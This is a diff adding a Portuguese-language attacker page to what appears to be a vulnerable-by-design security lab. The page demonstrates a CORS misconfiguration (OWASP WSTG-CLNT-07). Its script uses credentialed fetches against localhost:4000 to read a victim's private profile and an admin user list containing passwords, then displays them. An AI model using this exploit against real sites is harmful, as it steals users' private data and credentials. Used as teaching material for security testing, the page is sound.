@@ -1,0 +1,29 @@
+<!doctype html>
+<html lang="pt-br"><head><meta charset="utf-8"><title>CORS</title>
+<style>body{font-family:system-ui;background:#111;color:#eee;max-width:760px;margin:40px auto;padding:0 16px;line-height:1.6}
+button{background:#ef4444;color:#fff;border:0;padding:12px 20px;border-radius:8px;cursor:pointer}
+pre{background:#000;padding:12px;border-radius:8px;overflow:auto;white-space:pre-wrap}code{background:#222;padding:2px 6px;border-radius:4px}</style>
+</head><body>
+  <h1>CORS mal configurado — roubo de dados <code>[WSTG-CLNT-07]</code></h1>
+  <p>Como em Low/Medium o backend reflete qualquer <code>Origin</code> com
+     <code>Allow-Credentials: true</code>, este site consegue ler respostas
+     <b>autenticadas</b> da vítima. Em High o CORS é restrito e o navegador bloqueia.</p>
+  <button onclick="roubar()">Roubar dados da vítima</button>
+  <pre id="out">—</pre>
+  <script>
+    async function roubar() {
+      const out = document.getElementById('out');
+      out.textContent = 'buscando...';
+      try {
+        // perfil da vítima (privado) + tentativa na lista de usuários (admin)
+        const perfil = await (await fetch('http://localhost:4000/api/perfil', { credentials: 'include' })).json();
+        let usuarios = null;
+        try { usuarios = await (await fetch('http://localhost:4000/api/admin/usuarios', { credentials: 'include' })).json(); } catch (e) {}
+        out.textContent = 'PERFIL DA VITIMA:\n' + JSON.stringify(perfil, null, 2) +
+          (usuarios ? '\n\nLISTA DE USUARIOS (senhas!):\n' + JSON.stringify(usuarios, null, 2) : '');
+      } catch (e) {
+        out.textContent = 'BLOQUEADO pelo navegador (CORS restrito / High): ' + e.message;
+      }
+    }
+  </script>
+</body></html>
